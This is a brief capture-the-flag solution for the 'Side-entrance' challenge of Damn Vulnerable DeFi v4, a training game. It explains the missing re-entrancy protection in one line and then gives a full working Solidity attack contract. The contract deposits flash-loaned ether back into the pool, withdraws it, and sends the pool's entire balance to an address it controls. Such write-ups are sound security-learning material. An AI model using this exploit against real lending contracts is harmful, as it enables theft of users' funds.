# 4. Side-entrance

- The solution here was simple - there was no re-entrancy guards anywhere so when entering the flashLoan function I side-entered another function.

```solidity
// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {SideEntranceLenderPool, IFlashLoanEtherReceiver} from "../SideEntranceLenderPool.sol";

contract SideEntranceLenderPoolAttack is IFlashLoanEtherReceiver {
    SideEntranceLenderPool immutable targetPool;
    address immutable recovery;

    constructor(SideEntranceLenderPool _pool, address _recovery) {
        targetPool = _pool;
        recovery = _recovery;
    }

    function attack() external {
        targetPool.flashLoan(address(targetPool).balance);
        targetPool.withdraw();
        payable(recovery).transfer(address(this).balance);
    }

    function execute() external payable {
        targetPool.deposit{value: msg.value}();
    }

    receive() external payable {}
}
```
